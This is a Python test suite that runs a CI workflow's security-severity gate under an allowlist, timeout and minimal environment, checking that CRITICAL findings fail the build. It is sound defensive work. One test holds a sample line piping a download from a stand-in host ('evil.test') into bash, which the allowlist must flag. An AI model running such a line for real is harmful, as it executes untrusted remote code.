"""
Behavioural guard: the `Security Scan Gate` severity block must actually FAIL the
build on a CRITICAL finding — proven by running it, not by reading it.

WHY THIS EXISTS (and why it is not another parser)
--------------------------------------------------
`test_ci_security_gate.py` asserts the gate's `exit 1` by scanning `run:` text.
That approach was defeated three times running, each fix looking closed until the
next adversarial pass:

    original guard        1 shape   a `#` comment line anchored the scan in itself
    #402's fix            4 shapes  quoted string / heredoc / YAML scalar / dead branch
    the line-anchor fix   6 shapes  + space-indented heredoc terminator, two
                                    heredocs on a line, split and non-word
                                    delimiters, and ANY multi-line YAML scalar

In every one the block was deleted, the YAML stayed valid, bash exited 0 on a
CRITICAL, and the guard returned a body containing `exit 1`. ADR-001 calls a
third patch to an enumeration a redesign signal. The root cause is structural:
"the anchor starts a line" is a NECESSARY condition for "the anchor is in shell
command position", never a sufficient one, and no line scanner reaches the
reachability shapes at all — `if false; then <gate> fi`, an `elif` that cannot be
true, or `case … never) exit 1 ;;`.

Executing the block collapses all of that. There is nothing to evade: either the
process exits non-zero on a CRITICAL or it does not.

It collapses the SHELL-level class only. A WORKFLOW-level disable — a step-level
`if: false` — is invisible to the executed body, and the first draft of this file
wrongly listed it as covered. `test_gate_step_has_no_if_condition` closes that
half separately.

SEMANTICS
---------
BEHAVIOUR, not presence. Rewriting, reformatting or reordering the gate stays
green as long as a CRITICAL still fails and a clean scan still passes. Deleting
it, commenting it out, or making it unreachable by any means trips this.

EXECUTION SAFETY (read before editing the extractor)
----------------------------------------------------
This runs shell taken from a workflow file, so a mis-extraction executes
something unintended. A first prototype used a greedy regex, captured the rest of
the file, and really did start `python3 -m http.server 8080` and `npx lighthouse`
on the developer's machine. Three guardrails, all fail-closed:

1. Extraction is bounded by INDENTATION — it stops at the first non-blank line
   indented at or below the `run:` key's column.
2. Every command word in the extracted block must be in `_ALLOWED_COMMANDS`. An
   unrecognised one aborts WITHOUT running anything. Direction is a false alarm:
   a legitimate new command in the gate makes this test fail loudly and demand a
   one-line allowlist update, which is the review moment we want.
3. The block runs in a fresh temp cwd with stdin closed and a hard timeout.

stdlib-only, no network, and the only subprocess is the gate itself under the
guardrails above. Runs under pytest and `python3 -m unittest`.

OWASP CICD-SEC-1 (Insufficient Flow Control); NIST SSDF (SP 800-218) PO.3, PW.4.
"""

import re
import subprocess
import tempfile
import unittest
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parents[2]
WORKFLOW = REPO_ROOT / ".github" / "workflows" / "security-scan.yml"
STEP_NAME = "Check for critical/high failures"

# Command words the severity gate is allowed to invoke. Anything else aborts
# before execution (see EXECUTION SAFETY above).
_ALLOWED_COMMANDS = frozenset({"grep", "echo", "true", "exit", "wc", "cat", "printf"})

# Shell keywords and operators that are not commands.
_SHELL_WORDS = frozenset(
    {"if", "then", "else", "elif", "fi", "for", "do", "done", "while", "case", "esac"}
)

# A generous ceiling. The gate is ~11 lines; anything far larger means the
# extractor over-captured, which is exactly how the prototype ran a web server.
_MAX_BLOCK_LINES = 40

# Taken from the shape scanner/lib/output.sh actually emits, not invented. The
# first version used `✗ CRITICAL: …`, which matched only via the gate's
# `✗.*critical` arm — so if the emitter ever dropped the glyph the gate would go
# dead in production while this test stayed green (review of #404, F6).
# `test_fixture_matches_the_real_emitter` pins the two together.
_CRITICAL_FIXTURE = "✗ FAIL  [SEC-001] hardcoded secret in config (CRITICAL)\n"
_CLEAN_FIXTURE = "✓ All checks passed\n"


def find_step_blocks(text: str, step_name: str) -> list:
    """Every step block whose `- name:` value EQUALS `step_name`.

    Equality on the parsed value, not `in`. The first version used a substring
    test and took the first hit, so a PRECEDING step named
    `Check for critical/high failures (advisory preview)` shadowed the real one
    and the suite validated the decoy while the real gate echoed a notice
    (adversarial review of #404, F2). Duplicates are returned rather than
    silently resolved, so the caller can refuse to guess.
    """
    lines = text.splitlines()
    out = []
    for i, line in enumerate(lines):
        m = re.match(r"^(\s*)-\s+name:\s*(.+?)\s*$", line)
        if not m or m.group(2).strip("\"'") != step_name:
            continue
        col = line.index("- name:")
        block = [line]
        for nxt in lines[i + 1:]:
            if nxt.strip() and (len(nxt) - len(nxt.lstrip())) <= col:
                break
            block.append(nxt)
        out.append("\n".join(block))
    return out


# Literal block scalars only. A FOLDED scalar (`>`) joins lines with spaces,
# which changes shell meaning, and any other form is unrecognised — both fail
# closed rather than being guessed at.
_RUN_LITERAL_RE = re.compile(r"^(\s*)run:\s*\|[+-]?\s*$")


def extract_run_block(text: str, step_name: str):
    """The dedented body of `step_name`'s literal `run: |` block, or None.

    Scoped to the step, twice over. The first version searched FORWARD from the
    step name for the next line equal to `run: |`, which walks straight out of
    the step when the gate uses any other spelling. `run: |-` — semantically
    identical for a shell step, and a one-character edit — made this return the
    `lighthouse` job's `Serve and audit` body, so the suite really did execute
    `python3 -m http.server 8080 &` and `npx lighthouse`: the exact prototype
    disaster the docstring claimed was fixed (adversarial review of #404, F4).

    Now: locate the step block (indentation-bounded), require exactly one, and
    take the `run:` key from INSIDE that block. An unrecognised scalar form
    returns None, which trips the `test_step_is_found` canary loudly.
    """
    blocks = find_step_blocks(text, step_name)
    if len(blocks) != 1:
        return None
    lines = blocks[0].splitlines()
    run_i = next((i for i, l in enumerate(lines) if _RUN_LITERAL_RE.match(l)), None)
    if run_i is None:
        return None
    run_col = len(lines[run_i]) - len(lines[run_i].lstrip())
    body = []
    for line in lines[run_i + 1:]:
        if line.strip() and (len(line) - len(line.lstrip())) <= run_col:
            break
        body.append(line)
    if not body:
        return None
    indent = min((len(l) - len(l.lstrip())) for l in body if l.strip())
    return "\n".join(l[indent:] if l.strip() else "" for l in body).rstrip() + "\n"



def step_block(text: str, step_name: str):
    """The whole `- name: <step_name>` step block (to the next step at the same
    indent), or None. Used to check the step's own YAML keys, which the executed
    `run:` body cannot see."""
    lines = text.splitlines()
    try:
        start = next(i for i, l in enumerate(lines) if f"- name: {step_name}" in l)
    except StopIteration:
        return None
    col = lines[start].index("- name:")
    out = [lines[start]]
    for line in lines[start + 1:]:
        # Bound by INDENTATION, not by "the next `- `". This step is the LAST in
        # its job, so a next-list-item rule ran on into the following job and
        # captured 27 lines instead of 13 — the control only stayed green because
        # that job's `if:` happens to sit at 4 spaces, not 8. A sibling STEP's
        # `if:` would have false-tripped it.
        if line.strip() and (len(line) - len(line.lstrip())) <= col:
            break
        out.append(line)
    return "\n".join(out)


# A step-level `if:` key. Matched bare or quoted, per the repo's YAML-shape rule.
_STEP_IF_RE = re.compile(r"""(?m)^\s{8}(?:if|"if"|'if')\s*:""")

# `continue-on-error: true` makes the step's exit code irrelevant — the job
# concludes success anyway. Zero enforcement of this key exists anywhere in the
# repo today and it is already used in dast-full-scan.yml, dast-baseline.yml and
# lint.yml, so adding it to the gate would read as routine (review of #404, F1).
_STEP_COE_RE = re.compile(
    r"""(?m)^\s{8}(?:continue-on-error|"continue-on-error"|'continue-on-error')\s*:\s*(\S+)"""
)


def _split_statements(script: str) -> list:
    r"""Split `script` on shell separators, QUOTE-AWARE.

    A naive `re.split(r"[;\n]|\|\||&&|\|", …)` cuts inside quoted strings. The
    gate's own `grep -ci '✗.*critical\|CRITICAL.*Fail'` carries an escaped `\|`
    inside single quotes, so the naive split produced the phantom "commands"
    `CRITICAL.*Fail` and `HIGH.*Fail` — the ERE-pipe class this repo has hit
    before. A separator inside quotes is not a separator."""
    out, buf, quote = [], [], None
    i = 0
    while i < len(script):
        ch = script[i]
        if quote:
            buf.append(ch)
            if ch == "\\" and quote == '"' and i + 1 < len(script):
                buf.append(script[i + 1]); i += 2; continue
            if ch == quote:
                quote = None
        elif ch in "'\"":
            quote = ch; buf.append(ch)
        elif ch in ";\n":
            out.append("".join(buf)); buf = []
        elif ch == "&" and script[i:i + 2] == "&&":
            out.append("".join(buf)); buf = []; i += 2; continue
        elif ch == "|":
            out.append("".join(buf)); buf = []
            if script[i:i + 2] == "||":
                i += 2; continue
        else:
            buf.append(ch)
        i += 1
    out.append("".join(buf))
    return out


def unexpected_commands(script: str) -> list:
    """Command words in `script` outside `_ALLOWED_COMMANDS`.

    Deliberately crude and over-reporting: the first word of every statement,
    split on `;`, `|`, `&&`, `||` and newlines, minus shell keywords, assignments
    and `$(`-substitution openers. A false hit costs one allowlist line; a false
    MISS would execute an unvetted command from a workflow file."""
    found = []
    for stmt in _split_statements(script):
        stmt = stmt.strip()
        if not stmt or stmt.startswith("#"):
            continue
        # `VAR=$(cmd ...)` — judge the substituted command, not the assignment.
        m = re.match(r"^[A-Za-z_][A-Za-z0-9_]*=\$\((.*)$", stmt)
        if m:
            stmt = m.group(1).strip()
        elif re.match(r"^[A-Za-z_][A-Za-z0-9_]*=", stmt):
            continue
        word = stmt.split()[0].strip("()$`\"'")
        if not word or word in _SHELL_WORDS or word.startswith("["):
            continue
        if word not in _ALLOWED_COMMANDS:
            found.append(word)
    return sorted(set(found))


class UnvettedCommand(RuntimeError):
    """Raised INSTEAD of executing a script containing a non-allowlisted word."""


def run_gate(script: str, scan_output: str):
    """Execute `script` in a throwaway cwd holding `scan-output.txt`.

    The allowlist is enforced HERE, as a precondition. It used to be only a
    separate assertion (`test_only_allowlisted_commands`), so it stopped nothing:
    under `python3 -m unittest` the alphabetically earlier
    `test_critical_finding_fails_the_build` ran first and executed whatever had
    been extracted. Combined with the extraction hijack that meant a foreign
    `run:` body really did execute — the PR body called this guardrail
    "aborts before running anything" while the code did not (adversarial review
    of #404, F4). Now it does."""
    bad = unexpected_commands(script)
    if bad:
        raise UnvettedCommand(
            f"refusing to execute: {bad} not in _ALLOWED_COMMANDS. "
            "Review the command, then add it to the allowlist."
        )
    with tempfile.TemporaryDirectory() as d:
        Path(d, "scan-output.txt").write_text(scan_output, encoding="utf-8")
        Path(d, "gate.sh").write_text(script, encoding="utf-8")
        # Minimal env: the gate needs none of the parent's ~850 chars of
        # HOME/PATH/etc, and a leaked credential in the environment has no
        # business inside a script read out of a workflow file.
        return subprocess.run(
            ["bash", "gate.sh"],
            cwd=d,
            capture_output=True,
            text=True,
            stdin=subprocess.DEVNULL,
            timeout=30,
            env={"PATH": "/usr/bin:/bin", "LC_ALL": "C.UTF-8"},
        )


class TestSecurityGateBehaviour(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.text = WORKFLOW.read_text(encoding="utf-8") if WORKFLOW.is_file() else ""
        cls.script = extract_run_block(cls.text, STEP_NAME)

    def test_workflow_exists(self):
        self.assertTrue(WORKFLOW.is_file(), f"{WORKFLOW} not found — path assumption broke")

    def test_step_is_found(self):
        # Canary: renaming the step must fail loudly, not silently skip the only
        # behavioural proof the severity gate has.
        self.assertIsNotNone(
            self.script,
            f"step {STEP_NAME!r} with a `run: |` block not found in "
            f"{WORKFLOW.name}. If it was renamed, update STEP_NAME — do NOT let "
            "this test quietly stop running.",
        )

    def test_extraction_is_bounded(self):
        self.assertLessEqual(
            len(self.script.splitlines()),
            _MAX_BLOCK_LINES,
            "extracted block is far larger than the gate — the extractor "
            "over-captured and would execute unintended commands",
        )

    def test_only_allowlisted_commands(self):
        unexpected = unexpected_commands(self.script)
        self.assertEqual(
            unexpected,
            [],
            f"the gate now invokes {unexpected}, which is not in "
            "_ALLOWED_COMMANDS. Review the command, then add it — this test "
            "refuses to execute an unvetted command out of a workflow file.",
        )

    def test_gate_step_has_no_if_condition(self):
        """Executing the `run:` body cannot see the step's own `if:` key.

        Found by self-review AFTER the first draft of this file claimed the
        behavioural test caught "a step-level `if: false`". It does not: adding
        `if: false` to the step leaves the extracted script exiting 1 on the
        CRITICAL fixture — green — while in CI the step never runs at all and a
        critical stops blocking. Verified by mutating the real workflow.

        So the workflow-level half is asserted here, separately: the gate step
        must carry NO `if:` at all. Direction is presence — adding any condition,
        even a legitimate one, fails this and demands the reasoning be reviewed
        and this test updated. Job-level `if:` is NOT forbidden: the `scan` job is
        legitimately path-gated and `Security Scan Gate` treats `skipped` as
        passing."""
        block = step_block(self.text, STEP_NAME)
        self.assertIsNotNone(block, f"step {STEP_NAME!r} not found")
        m = _STEP_IF_RE.search(block)
        self.assertIsNone(
            m,
            "the severity-gate step now carries a step-level `if:` — the executed "
            "`run:` body cannot see it, so this suite would stay green while the "
            "step never runs in CI:\n  "
            + block[m.start():m.start() + 60].strip() if m else "",
        )

    def test_gate_step_does_not_swallow_its_exit_code(self):
        """`continue-on-error: true` would make the gate's `exit 1` irrelevant.

        Invisible to an executor — the exit code is discarded by the RUNNER, not
        by the script — so this needs its own workflow-level assertion, exactly
        like the step-level `if:` above."""
        block = step_block(self.text, STEP_NAME)
        self.assertIsNotNone(block, f"step {STEP_NAME!r} not found or ambiguous")
        m = _STEP_COE_RE.search(block)
        self.assertIsNone(
            m,
            "the severity-gate step now sets `continue-on-error` — its `exit 1` "
            "would be discarded and the job would conclude success on a CRITICAL, "
            "while this suite stays green because the script itself is unchanged.",
        )

    def test_critical_finding_fails_the_build(self):
        r = run_gate(self.script, _CRITICAL_FIXTURE)
        self.assertNotEqual(
            r.returncode,
            0,
            "the severity gate exited 0 on a CRITICAL finding — a critical no "
            "longer blocks the merge.\n"
            f"stdout:\n{r.stdout}\nstderr:\n{r.stderr}",
        )

    def test_fixture_matches_the_real_emitter(self):
        """The fixture must look like what the scanner really prints.

        Without this the gate's grep pattern and the emitter can drift apart:
        the gate stops matching real output (dead in production) while the
        synthetic fixture keeps it green."""
        emitter = REPO_ROOT / "scanner" / "lib" / "output.sh"
        self.assertTrue(emitter.is_file(), f"{emitter} not found")
        # Comment-stripped, line-anchored: a `#`-commented mention of the shape
        # must not satisfy this. Caught by the repo's own
        # test_ci_guard_assertion_scoping meta-guard on the first draft, which
        # asserted against the raw file text — the inert-assertion class.
        active = "\n".join(
            l for l in emitter.read_text(encoding="utf-8").splitlines()
            if not l.lstrip().startswith("#")
        )
        self.assertRegex(
            active,
            r"(?m)^.*✗ FAIL",
            "scanner/lib/output.sh no longer emits the `✗ FAIL` shape this "
            "fixture imitates — re-derive _CRITICAL_FIXTURE from the emitter and "
            "confirm the gate's grep pattern still matches it.",
        )

    def test_clean_scan_passes(self):
        # The other direction: the gate must not fail an ordinary build, or it
        # would be disabled within the day.
        r = run_gate(self.script, _CLEAN_FIXTURE)
        self.assertEqual(
            r.returncode, 0, f"clean scan failed the build.\nstdout:\n{r.stdout}\nstderr:\n{r.stderr}"
        )


class TestGateBehaviourDetector(unittest.TestCase):
    """Mutation self-tests. Each case is a shape that defeated the line-scanning
    guard; executing the block catches all of them, including the three
    reachability shapes no text matcher can reach."""

    @classmethod
    def setUpClass(cls):
        cls.script = extract_run_block(
            WORKFLOW.read_text(encoding="utf-8") if WORKFLOW.is_file() else "", STEP_NAME
        )

    _GATE_RE = r'if \[ "\$CRITS" -gt 0 \]; then\n(?:.*\n)*?fi\n'

    def _assert_caught(self, mutant, why):
        # No-op guard on EVERY mutation, not just the first. Without it a
        # `str.replace` that silently matches nothing asserts on the UNMUTATED
        # script, which is vacuously green whenever the gate is already dead
        # (review of #404, F7).
        self.assertNotEqual(
            mutant, self.script, "mutation did not apply — the test is vacuous: " + why
        )
        self.assertEqual(
            run_gate(mutant, _CRITICAL_FIXTURE).returncode, 0,
            "the mutation was supposed to disable the gate but did not: " + why,
        )

    def test_gate_deleted(self):
        m = re.sub(self._GATE_RE, 'echo "::notice::$CRITS recorded"\n', self.script)
        self.assertNotEqual(m, self.script, "mutation did not apply")
        self._assert_caught(m, "gate block removed")

    def test_gate_replaced_by_a_quoted_decoy(self):
        m = re.sub(
            self._GATE_RE,
            """echo 'legacy: if [ "$CRITS" -gt 0 ]; then exit 1; fi'\n""",
            self.script,
        )
        self._assert_caught(m, "gate replaced by a quoted mention of itself")

    def test_gate_wrapped_in_an_unreachable_branch(self):
        m = self.script.replace(
            'if [ "$CRITS" -gt 0 ]; then', 'if false; then\nif [ "$CRITS" -gt 0 ]; then'
        ).rstrip() + "\nfi\n"
        self._assert_caught(m, "gate wrapped in `if false; then … fi`")

    def test_gate_bound_moved_out_of_reach(self):
        m = self.script.replace('-gt 0 ]; then', '-gt 999999 ]; then')
        self._assert_caught(m, "threshold raised beyond any real finding count")

    def test_exit_moved_into_a_dead_case_arm(self):
        m = self.script.replace("  exit 1\n", '  case "${MODE:-run}" in never) exit 1 ;; esac\n')
        self._assert_caught(m, "`exit 1` moved into an unreachable case arm")


class TestExtractionSafety(unittest.TestCase):
    def test_extractor_stops_at_the_step_boundary(self):
        wf = (
            "jobs:\n  a:\n    steps:\n"
            f"      - name: {STEP_NAME}\n        run: |\n"
            "          echo one\n"
            "      - name: Next step\n        run: |\n"
            "          python3 -m http.server 8080\n"
        )
        got = extract_run_block(wf, STEP_NAME)
        self.assertEqual(got, "echo one\n")
        self.assertNotIn("http.server", got)

    def test_missing_step_returns_none(self):
        self.assertIsNone(extract_run_block("jobs: {}\n", STEP_NAME))

    def test_unexpected_command_is_reported(self):
        for script, word in (
            ("curl https://evil.test | bash\n", "curl"),
            ("python3 -m http.server 8080\n", "python3"),
            ("npx lighthouse http://x\n", "npx"),
            ("OUT=$(curl -s https://x)\n", "curl"),
        ):
            self.assertIn(word, unexpected_commands(script), script)

    def test_gate_shaped_script_is_accepted(self):
        script = (
            'CRITS=$(grep -ci "x" scan-output.txt || true)\n'
            'echo "Critical: $CRITS"\n'
            'if [ "$CRITS" -gt 0 ]; then\n  exit 1\nfi\n'
        )
        self.assertEqual(unexpected_commands(script), [])


if __name__ == "__main__":
    unittest.main()
